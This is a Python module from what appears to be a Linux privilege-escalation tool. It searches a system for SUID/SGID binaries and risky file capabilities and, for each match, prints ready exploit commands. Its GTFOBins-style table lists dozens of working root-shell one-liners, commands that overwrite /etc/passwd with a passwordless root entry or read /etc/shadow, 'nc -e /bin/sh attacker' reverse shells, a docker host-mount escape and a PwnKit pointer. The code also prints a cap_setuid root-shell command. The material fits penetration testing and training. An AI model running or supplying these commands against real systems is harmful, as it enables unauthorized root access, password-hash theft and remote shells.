"""
SUID / SGID / Capabilities Module
SUID binaries run as the file owner (often root) regardless of who runs them.
This is one of the most common Linux privesc vectors.
"""

import os
from LD_PRELOAD.utils.output import print_found, print_info, print_warn, print_critical, run_cmd

# Known exploitable SUID/SGID binaries from GTFOBins
GTFO_SUID = {
    "bash":      "bash -p",
    "sh":        "sh -p",
    "dash":      "dash -p",
    "find":      "find . -exec /bin/bash -p \\; -quit",
    "vim":       "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
    "vi":        "vi -c ':!sh'",
    "nano":      "nano — then Ctrl+R Ctrl+X then 'reset; sh 1>&0 2>&0'",
    "less":      "less /etc/passwd → then !sh",
    "more":      "more /etc/passwd → then !sh",
    "man":       "man man → then !sh",
    "nmap":      "nmap --interactive → then !sh  (old nmap)",
    "perl":      "perl -e 'exec \"/bin/sh\";'",
    "python":    "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    "python3":   "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    "ruby":      "ruby -e 'exec \"/bin/sh\"'",
    "lua":       "lua -e 'os.execute(\"/bin/sh\")'",
    "php":       "php -r 'pcntl_exec(\"/bin/sh\", [\"-p\"]);'",
    "awk":       "awk 'BEGIN {system(\"/bin/sh\")}'",
    "gawk":      "gawk 'BEGIN {system(\"/bin/sh\")}'",
    "node":      "node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'",
    "env":       "env /bin/sh -p",
    "tclsh":     "tclsh → exec /bin/sh -p",
    "expect":    "expect -c 'spawn /bin/sh -p; interact'",
    "tar":       "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    "zip":       "zip /tmp/x.zip /tmp/x -T --unzip-command='sh -c /bin/sh'",
    "unzip":     "unzip -K shell.zip #(if zip contains setuid shell)",
    "cp":        "cp /bin/bash /tmp/bash; cp --attributes-only --preserve=all ... (complex)",
    "chmod":     "chmod +s /bin/bash → then bash -p",
    "chown":     "chown user:user /etc/shadow → read hashes",
    "dd":        "echo 'root::0:0:::/bin/bash' | dd of=/etc/passwd bs=1 seek=0 conv=notrunc",
    "tee":       "echo 'root::0:0:::/bin/bash' | tee -a /etc/passwd",
    "cat":       "cat /etc/shadow",
    "head":      "head -n 10 /etc/shadow",
    "tail":      "tail -n 10 /etc/shadow",
    "cut":       "cut -d: -f1 /etc/shadow",
    "sort":      "sort /etc/shadow",
    "base64":    "base64 /etc/shadow | base64 -d",
    "openssl":   "openssl enc -in /etc/shadow",
    "curl":      "curl file:///etc/shadow",
    "wget":      "wget -O- file:///etc/shadow",
    "ssh":       "ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
    "git":       "git help config → then !/bin/sh",
    "ftp":       "ftp → then ! /bin/sh",
    "strace":    "strace -o /dev/null /bin/sh -p",
    "ltrace":    "ltrace /bin/sh -p",
    "gdb":       "gdb -nx -ex '!sh' -ex quit",
    "make":      "make -s --eval=$'x:\\n\\t-'\"/bin/sh -p\"",
    "socat":     "socat stdin exec:'sh -p',pty,stderr,setsid,sigint,sane",
    "nc":        "nc -e /bin/sh attacker 4444",
    "netcat":    "nc -e /bin/sh attacker 4444",
    "screen":    "screen  (old versions vulnerable)",
    "tmux":      "tmux (session hijacking)",
    "pkexec":    "CVE-2021-4034 (PwnKit) — just run it!",
    "passwd":    "passwd → may allow reading /etc/shadow",
    "su":        "su root",
    "sudo":      "sudo -l first",
    "crontab":   "crontab -e → add reverse shell",
    "mysql":     "mysql -e '\\! /bin/sh'",
    "psql":      "psql -c '\\! /bin/sh'",
    "sqlite3":   "sqlite3 /dev/null '.shell /bin/sh'",
    "docker":    "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    "lxd":       "lxd/lxc container escape",
    "rsync":     "rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
}

# Linux capabilities that allow privilege escalation
DANGEROUS_CAPS = {
    "cap_setuid":      "🚨 Can set UID to 0 (root) — direct privesc!",
    "cap_setgid":      "🚨 Can set GID to 0 — direct privesc!",
    "cap_net_raw":     "⚠️  Raw network access — sniff traffic",
    "cap_net_admin":   "⚠️  Network admin — potential MITM",
    "cap_sys_admin":   "🚨 Basically root — mount, ptrace, many attacks",
    "cap_sys_ptrace":  "🚨 Can trace/inject into any process including root",
    "cap_dac_override":"🚨 Bypass file read/write permissions — read /etc/shadow!",
    "cap_dac_read_search": "🚨 Bypass file read permissions",
    "cap_chown":       "⚠️  Can chown any file — chown yourself /etc/shadow",
    "cap_fowner":      "⚠️  Bypass file ownership checks",
    "cap_sys_module":  "🚨 Load kernel modules — rootkit!",
    "cap_sys_rawio":   "🚨 Raw I/O access",
    "cap_mknod":       "⚠️  Create device files",
    "cap_audit_write": "ℹ️  Write to audit log",
}


def find_suid_binaries() -> list:
    """Find all SUID/SGID binaries on the system."""
    findings = []

    print_info("Searching for SUID binaries (this takes ~10s)...")
    # SUID = -perm -4000, SGID = -perm -2000
    output = run_cmd(
        "find / -perm -4000 -o -perm -2000 2>/dev/null "
        "| grep -v proc | grep -v sys | sort"
    )

    for line in output.split("\n"):
        path = line.strip()
        if not path:
            continue

        binary_name = os.path.basename(path).lower()
        # Strip version numbers: python3.10 → python3
        binary_base = binary_name.split(".")[0] if "." in binary_name else binary_name

        is_suid = run_cmd(f"ls -la '{path}' 2>/dev/null")
        suid_type = "SUID" if "s" in is_suid[3:4].lower() else "SGID"

        exploitable = binary_name in GTFO_SUID or binary_base in GTFO_SUID
        exploit_cmd = GTFO_SUID.get(binary_name) or GTFO_SUID.get(binary_base, "")

        entry = {
            "path": path,
            "name": binary_name,
            "type": suid_type,
            "exploitable": exploitable,
            "exploit": exploit_cmd,
            "ls": is_suid.strip(),
        }
        findings.append(entry)

        if exploitable:
            print_critical(f"[{suid_type}] 🔥 EXPLOITABLE: {path}")
            print_critical(f"        → Exploit: {exploit_cmd}")
            print_critical(f"        → GTFOBins: https://gtfobins.github.io/gtfobins/{binary_base}/#{suid_type.lower()}")
        else:
            print_found(f"[{suid_type}] {path}")

    return findings


def check_capabilities() -> list:
    """
    Check Linux capabilities on binaries.
    Capabilities can grant root-like powers to specific programs.
    e.g. python3 with cap_setuid = instant root
    """
    print_info("Checking Linux capabilities...")
    findings = []

    output = run_cmd("getcap -r / 2>/dev/null")
    if not output:
        print_info("No capabilities found or getcap not available.")
        return findings

    for line in output.split("\n"):
        line = line.strip()
        if not line:
            continue

        # Format: /usr/bin/python3 = cap_setuid+ep
        parts = line.split(" = ")
        if len(parts) == 2:
            binary = parts[0].strip()
            caps   = parts[1].strip()

            dangerous = []
            for cap, desc in DANGEROUS_CAPS.items():
                if cap in caps.lower():
                    dangerous.append((cap, desc))

            entry = {
                "binary": binary,
                "capabilities": caps,
                "dangerous": dangerous,
            }
            findings.append(entry)

            if dangerous:
                print_critical(f"[CAP] 🚨 {binary} = {caps}")
                for cap, desc in dangerous:
                    print_critical(f"      {cap}: {desc}")
                # Specific exploit hints
                binary_name = os.path.basename(binary).split(".")[0]
                if "cap_setuid" in caps and binary_name in ["python", "python3", "perl", "ruby", "node"]:
                    print_critical(
                        f"      🔥 EXPLOIT: {binary} -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
                    )
                elif "cap_dac_read_search" in caps or "cap_dac_override" in caps:
                    print_critical(f"      🔥 EXPLOIT: {binary} → read /etc/shadow!")
            else:
                print_found(f"[CAP] {binary} = {caps}")

    return findings


def check_writable_suid() -> list:
    """Check if any SUID binary path is writable — replace binary with shell."""
    findings = []
    output = run_cmd("find / -perm -4000 2>/dev/null | grep -v proc")
    for line in output.split("\n"):
        path = line.strip()
        if not path:
            continue
        if os.access(path, os.W_OK):
            findings.append(path)
            print_critical(f"[SUID] 🚨 WRITABLE SUID binary: {path} — replace with shell!")
    return findings


def run() -> dict:
    print_info("Checking SUID/SGID binaries and capabilities...")
    return {
        "suid_sgid":     find_suid_binaries(),
        "capabilities":  check_capabilities(),
        "writable_suid": check_writable_suid(),
    }